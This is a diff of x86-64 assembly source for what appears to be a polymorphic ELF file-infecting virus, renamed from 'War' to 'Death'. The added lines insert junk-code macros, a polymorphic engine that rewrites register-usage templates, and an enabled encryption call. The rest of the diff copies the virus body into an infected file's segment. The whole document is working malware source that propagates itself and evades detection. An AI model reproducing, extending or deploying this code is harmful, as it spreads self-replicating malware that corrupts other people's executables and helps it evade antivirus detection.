@@ -195,7 +195,7 @@
 	mov		rax, [rbp + 16]
 	add		rax, mydata.p_offset
 	mov rax, [rax]
-	add rax, WAR_SIZE_NO_BSS
+	add rax, Death_SIZE_NO_BSS
 	mov		rsi, [rbp + 16]
 	add		rsi, mydata.p_offset
 	cmp rax, [rsi]
@@ -212,7 +212,7 @@
 	mov		rsi, [rbp + 16]
 	add		rsi, mydata.p_offset
 	mov		rsi, [rsi]
-	add		rsi, WAR_SIZE_NO_BSS
+	add		rsi, Death_SIZE_NO_BSS
 	mov		rax, [rbp + 16]
 	add		rax, mydata.file_size
 	mov		[rax], rsi
@@ -230,7 +230,7 @@
 	xor r9, r9
 	syscall
 	mov r14, rax
-
+	JUNK_5
 .no_extendinfection:
 	push rdi
 	push rsi
@@ -242,7 +242,7 @@
 	;	le mmap de death
 	mov rax, SYS_mmap
 	xor rdi, rdi
-	mov rsi, WAR_SIZE_NO_BSS
+	mov rsi, Death_SIZE_NO_BSS
 	mov rdx, PROT_READ | PROT_WRITE
 	mov r10, MAP_PRIVATE | MAP_ANONYMOUS
 	mov r8, -1
@@ -253,18 +253,94 @@
 	cmp rax, -4095
 	jae .returninfection
 	mov rbx, rax
+
+
+
+	JUNK_5
+
+
+
+
+
+
+	JUNK_5
+
+
+
 	mov rdi, rbx
+
+
+
 
 
 	mov		rsi, [rbp + 8]
 	;lea rsi, [rel _start]
 
 
-	mov rcx, WAR_SIZE_NO_BSS
+	mov rcx, Death_SIZE_NO_BSS
 	rep movsb
 
 
+	mov		r10, 10
 
+
+	lea		rdi, [rel _stop]
+
+	lea		rax, [rel _start]
+
+	sub		rdi, rax
+
+	add		rdi, rbx
+
+
+	mov		rax, rbx
+
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_sys
+	mov		r8, 9
+	mov		r9, 13
+
+	.poly:
+	dec		r10
+	%include "functions/polymorhp.s"
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdi
+	mov		r8, 7
+	mov		r9, 4
+	cmp		r10, 1
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rax
+	cmp		r10, 2
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rsi
+	cmp		r10, 3
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rdx
+	cmp		r10, 4
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_rcx
+	cmp		r10, 5
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r10
+	cmp		r10, 6
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r11
+	cmp		r10, 7
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r13
+	cmp		r10, 8
+	je		.poly
+	mov		rdx, [rbp + 16]
+	add		rdx, mydata.templates_r15
+	cmp		r10, 9
+	je		.poly
 
 
 	;lea	rax, [rel start_shuffle]
@@ -277,12 +353,20 @@
 
 	sub		rdi, rcx
 	sub		rsi, rcx
-
 	add		rdi, rbx
 	add		rsi, rbx
 
+	JUNK_5
+
 
 	call	shuffle
+
+
+
+
+
+
+	;lea		rdi, [rel _stop]
 
 
 
@@ -298,6 +382,7 @@
 
 
 	mov rdi, rbx
+	JUNK_5
 	mov		rax, [rbp + 24]
 	;lea rax, [rel _encrypted_start]
 
@@ -315,7 +400,7 @@
 	sub rdx, rcx
 	mov rsi, rdx
 	xor rdx, rdx
-	;call		[rbp]
+	call		[rbp]
 
 
 	mov		rdi, r14
@@ -323,11 +408,11 @@
 	add		rax, mydata.p_offset
 	add rdi, [rax]
 	mov rsi, rbx
-	mov rcx, WAR_SIZE_NO_BSS
+	mov rcx, Death_SIZE_NO_BSS
 	rep movsb
 
 	mov rdi, rbx
-	mov rsi, WAR_SIZE_NO_BSS
+	mov rsi, Death_SIZE_NO_BSS
 	mov rax, SYS_munmap
 	syscall
 
